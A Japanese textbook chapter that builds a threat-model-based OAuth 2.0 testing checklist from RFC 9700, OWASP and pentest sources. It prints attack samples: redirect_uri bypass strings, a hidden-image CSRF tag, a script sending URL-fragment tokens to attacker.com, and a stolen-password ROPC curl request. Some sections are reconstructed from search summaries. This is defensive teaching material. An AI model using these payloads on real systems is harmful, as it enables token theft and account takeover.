## チェックリストと検証方法論（脅威モデル・OWASP）

これまでの章では個々の脆弱性（redirect_uri の検証不備、state/PKCE の欠如、トークン漏洩など）を個別に見てきた。本節ではそれらを統合し、実際に安全な検証環境（自分で構築したラボや、書面での許可がある対象）で OAuth 2.0 実装を評価するときに使う「脅威モデルに基づくチェックリスト」と「検証方法論」をまとめる。目的はあくまで**防御**であり、実在サービスや本番環境への無許可のアクセス・改ざん・破壊的操作は対象外とする。チェックリストは「攻撃者がどこで何を悪用できるか」を体系化したものであり、それをそのまま「自組織の実装が該当項目を満たしているか」を確認する監査項目として読み替えて使ってほしい。

### 1. 脅威モデルという考え方（RFC 6819 / RFC 9700 との関係）

OAuth 2.0 のセキュリティ評価が場当たり的にならないのは、IETF が公開している脅威モデル文書があるからである。

- **RFC 6819**（OAuth 2.0 Threat Model and Security Considerations）は、認可コードフロー・インプリシットフロー双方について、攻撃者がどのポイント（ブラウザ、ネットワーク、認可サーバ、クライアント、リソースサーバ）に位置できるかを列挙し、各ポイントで成立する攻撃（トークン盗聴、リプレイ、CSRF、オープンリダイレクトなど）を体系立てて記述した最初期の公式文書である。
- **RFC 9700**（Best Current Practice for OAuth 2.0 Security, 2025年1月発行）は RFC 6819 以降に蓄積された実運用上の知見を反映した最新版の「べからず集」で、本教科書の他章でも繰り返し引用している。ここで重要な最新の到達点は次の3点である。
  1. **インプリシットグラントの非推奨**: 「Implicit Grant is deprecated by RFC 9700 and removed from OAuth 2.1」。アクセストークンが URL フラグメントに露出し、ブラウザ履歴・Referer・ログに残る構造的欠陥のため、SPA・ネイティブアプリを含む全クライアント種別で認可コードフロー＋PKCEへの移行が必須とされている。
  2. **redirect_uri の「完全一致」要求**: 認可サーバがクライアント登録時に受け付けるのは完全な redirect_uri であるべきで、パターンマッチ（ワイルドバックエンド一致）方式は「Redirect URI がトップレベルドメイン内のどこにでも一致してしまう」危険な実装だと明記される。
  3. **センダー制約付きトークン**（後述）の推奨。

脅威モデルに基づく検証とは、この RFC 6819/9700 が定義する「攻撃者がどの通信経路・保存領域に介入できるか」というモデルを出発点にして、各コンポーネント（認可エンドポイント、トークンエンドポイント、リダイレクト先、クライアントストレージ、リソースサーバ）ごとにチェック項目を割り当てる作業である。以降の各出典もすべてこの枠組みの具体化として読める。

> ⚠️ **未取得の資料**: 「Binary Brotherhood『OAuth 2.0 Threat Model / Pentest Checklist』」（https://binarybrotherhood.io/oauth2_threat_model.html）は、検証環境からの DNS 解決が失敗（`ENOTFOUND`）したため自動取得できませんでした。ミラー先（securityhubs.io、syncubes.com 等）も接続不可・403 のため未取得です。関心のある方は上記 URL および検索結果に挙がるミラーからご自身で直接ご覧ください。
>
> （以下は未取得資料の補足として一般知識に基づく解説です）このチェックリストは「IETF OAuth 2.0 Security Best Current Practice（RFC 6819/9700）を、ペンテスト現場で使える視覚的なチェックリストに単純化したもの」と位置づけられており、検索で得られた要約によれば主要カテゴリは次の7つである。
>
> 1. **Insufficient Redirect URI Validation**（redirect_uri 検証不足）: 完全一致でなくプレフィックス一致・部分一致・ドメインサフィックス一致で許可していないか。
> 2. **Credential Leakage via Referer Headers / Browser History**: 認可コードやトークンを含む URL がブラウザ履歴や、コールバックページが外部リソース（広告・アナリティクス・フォント CDN 等）を読み込む際の Referer ヘッダを通じて第三者に漏れないか。
> 3. **Mix-Up Attacks**（ミックスアップ攻撃）: クライアントが複数の認可サーバと連携している場合、悪意ある認可サーバが発行したコード/トークンを正規の認可サーバ宛だと誤認させられないか（`iss` パラメータや認可サーバごとに異なる redirect_uri で防ぐ）。
> 4. **Authorization Code Injection**（認可コード注入）: 攻撃者が自分の認可コードを被害者のブラウザに注入し、被害者のセッションに攻撃者のリソースを紐付けさせられないか（PKCE で防止）。
> 5. **Access Token Injection**（アクセストークン注入）: 同様に、攻撃者のアクセストークンを被害者のクライアントセッションに注入できないか（`sub`/`aud` の検証、OIDC の `id_token` 検証で防止）。
> 6. **Cross Site Request Forgery**: state パラメータ、あるいは PKCE 自体が持つ CSRF 保護（`code_verifier` を知らないと交換できない）を利用しているか。
> 7. **Access Token Leakage at the Resource Server**: リソースサーバがアクセストークンをログに記録したり、別のダウンストリームサービスへ不用意に転送していないか。
>
> これらは本章・前章までで個別に扱った脆弱性の総まとめであり、番号1・6は第2〜3章、3・4・5はトークン検証章、7はログ・監視の運用面に対応する。実際の検証では、この7分類を「テスト対象システム構成図」に重ね、各コンポーネント間の矢印ごとに該当項目がないか潰していくのが効率的である。

### 2. 実務的な検証方法論（コマンド例つき）

aw-junaid の「OAuth Exploitation」方法論は、上記の脅威モデルを実際のコマンドに落とし込んだ実践的リファレンスである。ここではその内容を、防御目的の**検証チェックリスト**として読み替えて紹介する（実施は自組織所有の環境またはスコープ内対象に限る）。

#### redirect_uri 検証の堅牢性テスト

原文が示すバイパス変種は次のとおりである。

```
redirect_uri=https://attacker.com.target.com
redirect_uri=https://target.com/callback/../attacker
redirect_uri=https://target.com%252eattacker.com
```

それぞれの成立理由は次の通りである。

- 1つ目はサブドメイン誤認（`target.com` を含む文字列一致で許可判定している実装が、実際には `attacker.com` というホストの下位ラベルとして `target.com` を配置した DNS 名を通してしまう）。
- 2つ目はパストラバーサル（`..` を含むパスをサーバ側で正規化せずに文字列プレフィックス一致だけで検証すると、ブラウザ側の実際の遷移先とサーバ側の検証対象パスがずれる）。
- 3つ目は二重URLエンコード（`%252e` は `%2e`＝`.` の二重エンコードで、WAF やパーサ層でデコード回数が食い違うと検証をすり抜ける）。

検証手順としては、プロキシ（Burp 等）で認可リクエストを捕捉し、`redirect_uri` を上記パターンに書き換えて認可サーバの応答を観察する。書き換えた値が「不正なリダイレクトURI」としてエラーになるか、それとも実際にリダイレクトが実行されるかを確認する。原文は Burp Collaborator を使い、`redirect_uri` を自分の Collaborator ドメインに差し替えて、`GET /?code=...&state=...` が着弾するかを見る手法も示している。着弾すれば認可コードが外部に漏洩する実証になる。RFC 9700 の「完全一致要求」の裏付けとして、この検証は該当実装がプレフィックス/サフィックス一致を使っていないかを直接確認するものである。

#### state パラメータの強度テスト

```html
<img src="https://target.com/authorize?response_type=code&
client_id=ATTACKER_CLIENT_ID&redirect_uri=https://target.com/callback&
scope=openid%20profile" style="display:none">
```

このような不可視 `<img>` タグを被害者に踏ませ、被害者のブラウザで認可フローの一部を強制的に開始させる CSRF 型の攻撃例である。state が存在しない、あるいはコールバック時に検証されない実装では、攻撃者が用意した認可結果（攻撃者の SNS アカウント等）を被害者のセッションに結び付けさせられる（アカウント統合型 CSRF）。検証時は、正規の state 値をコールバックで別の値に書き換えて許可されるか、また state 値自体が連番やタイムスタンプ由来で予測可能でないかを確認する。原文は CVE-2024-42476（Nim言語の OAuth ライブラリが特定のコンパイルフラグで state 検証を無効化していた実例）を挙げており、ライブラリ側の設定ミスでも同種の脆弱性が生まれることを示している。

#### トークン漏洩（フラグメント・Referer経路）

```javascript
// URLフラグメント中のトークンを盗み出す悪性ページの例
if (window.location.hash) {
    fetch('https://attacker.com/steal', {
        method: 'POST',
        body: window.location.hash
    });
}
```

これはインプリシントグラントや誤ってフラグメントにトークンを乗せる実装が対象になる。フラグメント（`#` 以降）はサーバに送信されないためログには残らないが、ブラウザ内で JavaScript から `window.location.hash` として読み取れる。コールバックページが外部スクリプト（広告タグ等）を読み込んでいると、そのスクリプトがこの値を盗める。これが RFC 9700 がインプリシットグラントを廃止した実務上の理由の一つである。防御側は「コールバックページでは外部リソースを一切読み込まない」「取得後は即座に `history.replaceState` 等でURLからトークンを消す」といった対策を検証項目に含めるべきである。

#### ROPC / デバイスコードのMFA迂回テスト

```bash
curl -X POST https://login.microsoftonline.com/token \
  -d "grant_type=password" \
  -d "client_id=KNOWN_PUBLIC_CLIENT" \
  -d "username=victim@target.com" \
  -d "password=stolen_password" \
  -d "scope=openid profile"
```

ROPC（Resource Owner Password Credentials）グラントはクライアントがユーザーの生パスワードを直接扱うため、認可サーバの通常のログイン画面を経由せず、MFA チャレンジが差し込まれない実装が存在しうる。原文はこれを「MFA 迂回の検証手段」として紹介している。同様にデバイスコードフロー（TVやIoT向け）では、攻撃者が正規のデバイスコード認可URLと `user_code` を用意し、フィッシングでユーザーに入力させ、裏でトークンエンドポイントをポーリングして被害者の認証完了を横取りする「デバイスコードフィッシング」も紹介されている。これは近年 Microsoft 365 環境などで実際に悪用が報告された手法（原文が言及する「ConsentFix Attack」も同系統）であり、検証チェックリストには「ROPC グラントが無効化されているか」「デバイスコードフローの認可URLに検証手段（画面上でのコード一致確認、タイムアウト短縮）があるか」を含めるべきである。

> 出典: OAuth Exploitation — https://github.com/aw-junaid/bug-bounty/blob/main/methodologies/web%20technologies/OAuth%20Exploitation.md

#### 補足: IDOR型アカウント乗っ取りの検証観点

原文はさらに、SNSログイン（例: Facebook ログイン連携）を実装する際に、アプリ側が「`oauthId` が一致すれば本人」と単純に信頼してしまう設計を指摘している。

```json
POST /api/login
{
    "loginType": "facebook",
    "oauthId": "1234567890123456",
    "email": "user@example.com"
}
```

この `oauthId` は多くの場合、対象ユーザーの公開プロフィールや `https://graph.facebook.com/me?fields=id&access_token=...` から第三者でも取得できる、あるいは XSS 経由で `localStorage` から窃取できる（他章のXSS/情報漏洩と関連）。検証観点は「サーバ側が本当にプロバイダのアクセストークンを検証しているか、それともクライアントから送られた `oauthId` を無条件に信頼しているか」であり、後者であればなりすましログインが成立してしまう。これは OAuth 自体の欠陥ではなく「OAuth を認証として誤用する実装」の欠陥である点に注意（本教科書の別章「OAuthと認証の違い」も参照）。

### 3. OWASP OAuth2 Cheat Sheet が示す設計原則チェックリスト

OWASP Cheat Sheet Series は、上記の攻撃手法に対する**恒久対策**を仕様として整理している。検証時はこの原則が実装で満たされているかを確認する。

- **オープンリダイレクタの排除**: クエリパラメータから任意のURIへ転送するエンドポイントを一切公開しない。認可コード／トークンの持ち出し経路として悪用されるためである。
- **CSRF対策**: 「PKCE がサポートされている場合は PKCE が提供する CSRF 保護で十分」とされ、OpenID Connect では `nonce` パラメータの使用、それ以外では「ユーザーエージェントに安全に紐付けられたワンタイム state トークン」の実装が求められる。
- **認可サーバ間の混同（Mix-Up）対策**: 複数の認可サーバと連携するクライアントは、`issuer` パラメータの検証か、認可サーバごとに異なる redirect_uri を用いることで、悪意ある認可サーバが発行したレスポンスを正規のものと誤認しないようにする。
- **PKCE**: 「公開クライアント（public client）が認可コードグラントを使う場合、認可コード横取り攻撃（authorization code interception attack）に脆弱である」ため PKCE が必須とされる。認可サーバ側は、認可リクエストに `code_challenge` が含まれていたにもかかわらずトークンリクエストで `code_verifier` を省略するような「ダウングレード攻撃」を拒否しなければならない。
- **インプリシットグラントの廃止**: 前述の通り RFC 9700 で非推奨、OAuth 2.1 で削除。SPA・ネイティブアプリを含め全クライアント種別で認可コード＋PKCEへ移行する。
- **センダー制約付きトークン（Sender-Constrained Tokens）**: 盗んだトークンをそのまま再利用（リプレイ）されないようにする仕組みとして2種類が提示される。
  - **DPoP（RFC 9449）**: クライアントが公開鍵ペアを生成し、リクエストごとにトークンのハッシュを含む署名付きJWT（proof）を添付する。相互TLSが不要でブラウザ・モバイル双方に適する。
  - **mTLS（RFC 8705）**: クライアント証明書によるTLS層での相互認証を行い、トークンを証明書のサムプリントに紐付ける。トランスポート層で完結しリクエストごとの追加処理が不要。
  - 適用が推奨される場面: マルチオーディエンストークン、金融・医療等の機微データ、高額取引、長寿命トークン、B2B連携、モバイル/ネイティブアプリ、複数ネットワーク境界をまたぐ分散アーキテクチャ。
- **リフレッシュトークンの保護**: DPoP/mTLSによるセンダー制約、またはリフレッシュトークンローテーション（使用の都度新しいトークンを発行し古いものを無効化してリプレイを検知）のいずれか、理想的には両方の組み合わせによる多層防御。
- **アクセストークンの権限最小化**: トークンは可能な限り単一のリソースサーバに限定する「オーディエンス制限」を行い、リソースサーバ側は毎リクエストでこれを検証する。`scope` および `authorization_details` パラメータでアクション単位の権限も制限する。
- **ROPCグラントの不使用**: ユーザーの生の認証情報をクライアントに直接扱わせるため、原則使用しない。
- **クライアント認証の非対称化**: 対称鍵（クライアントシークレット）ではなく、`mTLS` や `private_key_jwt` のような公開鍵方式を用いることで、認可サーバ側が機微な対称鍵を保管するリスクを排除する。
- **redirect_uri とトランスポート**: 認可レスポンスは暗号化された接続（HTTPS）を必須とし、ネイティブクライアントのループバックリダイレクション以外では `http` スキームの redirect_uri を許可してはならない。
- **クライアントIDの詐称防止**: クライアントが自身の `client_id` や `sub`、その他のクレームを操作してリソースオーナーになりすませないよう認可サーバ側で制御する。

> 出典: OWASP OAuth2 Cheat Sheet — https://cheatsheetseries.owasp.org/cheatsheets/OAuth2_Cheat_Sheet.html

### 4. ペンテスター視点の11項目チェックリスト（実装レビュー用）

Cristi Vlad の記事は、上記の仕様的なチェック項目を、より運用・実装寄りの11個の確認観点に整理している。監査担当者は次の順にレビューすると漏れが少ない。

1. **ソースコード中のハードコードされたシークレット**: リポジトリ全体（特にOSS化されたものや誤って公開されたもの）をシークレットスキャンし、クライアントシークレットが直書きされていないか確認する。
2. **環境間でのシークレット使い回し**: 開発・ステージング・本番でクライアントシークレットが共有されていないか。1つの漏洩が全環境に波及するのを防ぐため、環境ごとに異なるシークレットを発行しているか確認する。
3. **リフレッシュトークンの保存先**: ネイティブアプリで、リフレッシュトークンが暗号化なしで平文のローカルストレージ（例: Androidの `SharedPreferences` 平文、iOSの `UserDefaults`）に保存されていないか。Keychain/Keystore等の保護ストレージを使うべきである。
4. **アクセストークンの寿命とローテーション**: 有効期限が短く設定されているか、リフレッシュトークンローテーションが機能しているかをテストする。
5. **redirect_uri検証**（既出の項目と対応）。
6. **クライアント認証の平文送信有無**: TLSを使わずに、あるいは暗号化なしでクライアント認証情報が送信されていないか。
7. **認可リクエストのフィッシング耐性**: 偽の認可サーバ画面を用意されたときに、ユーザーが正規ドメインかどうかを判別する手がかり（証明書、URL）が十分に提示されているか、という運用・UI観点の確認。
8. **state パラメータの有無と検証**（既出）。
9. **クリックジャッキング対策**: 認可画面が `X-Frame-Options` や `Content-Security-Policy: frame-ancestors` なしで iframe 埋め込みを許可していないか。埋め込み可能だと、視覚的に偽装したUIの上に本物の同意ボタンを重ねて意図しない許可をクリックさせる攻撃が成立する。
10. **トークン通信の暗号化**: トークンエンドポイント・リソースサーバとの通信がTLSで保護されているか。
11. **スコープの過剰付与**: アプリが実際に必要とする範囲を超えたスコープを要求・付与していないか。過大なスコープは、トークン漏洩時の被害範囲をそのまま拡大させる。

> 出典: 11 Pro Tips for OAuth 2.0 Pentesting（Cristi Vlad, Medium） — https://cristivlad.medium.com/11-pro-tips-for-oauth-2-0-pentesting-5be06daa8996
>
> 注記: 本記事の直接取得は403エラーで失敗したため、上記11項目は検索結果から得られた要約（LinkedIn上の同著者による転載記事）に基づいて再構成したものである。数値の対応関係（何が第何項目か）は要約の提示順に従っており、原文の完全な文言とは異なる可能性がある点に留意されたい。

### 5. 統合検証チェックリスト（実施順）

以上を、安全な検証環境で使う「実施順チェックリスト」としてまとめる。各項目は該当する脅威モデルのカテゴリと対応している。

| # | 確認観点 | 対応する脅威モデル項目 |
|---|---|---|
| 1 | 認可コードグラント＋PKCEを使っているか（インプリシット禁止） | トークン漏洩、フラグメント経由の窃取 |
| 2 | `redirect_uri` は完全一致で検証されているか（プレフィックス/サフィックス一致でないか） | Insufficient Redirect URI Validation |
| 3 | 認可・コールバック画面は外部リソースを読み込んでいないか（Referer/履歴漏洩対策） | Credential Leakage via Referer/History |
| 4 | 複数の認可サーバと連携する場合、`issuer` 検証か redirect_uri 分離をしているか | Mix-Up Attacks |
| 5 | `code_verifier`/`code_challenge` の整合性を認可サーバが強制しているか（ダウングレード拒否） | Authorization Code Injection |
| 6 | `id_token`/`aud`/`sub` を検証し、トークンの発行先を確認しているか | Access Token Injection |
| 7 | state（またはPKCEのCSRF保護）が全フローで検証されているか | CSRF |
| 8 | アクセストークンがログや下流サービスに漏れていないか | Access Token Leakage at Resource Server |
| 9 | クライアントシークレットのハードコード・環境間使い回しがないか | シークレット管理 |
| 10 | リフレッシュトークンが保護ストレージに保存され、ローテーションされているか | トークン保存・リプレイ耐性 |
| 11 | ROPC・デバイスコードフローが不要に有効化されていないか | MFA迂回 |
| 12 | スコープが最小権限になっているか | 過剰権限 |
| 13 | 認可画面にクリックジャッキング対策（フレーム制御ヘッダ）があるか | UI起因の同意詐取 |
| 14 | 可能であればDPoP/mTLSでトークンをセンダー制約しているか | トークンリプレイ全般 |

このチェックリストを、対象システムの構成図（クライアント・認可サーバ・リソースサーバ・ブラウザの4者間の通信経路）に重ねて上から順に潰していくことで、脅威モデルに基づいた漏れのない検証ができる。次章以降では、この方法論を安全なラボ環境上で実際にどう組み立てて手を動かすかを扱う。
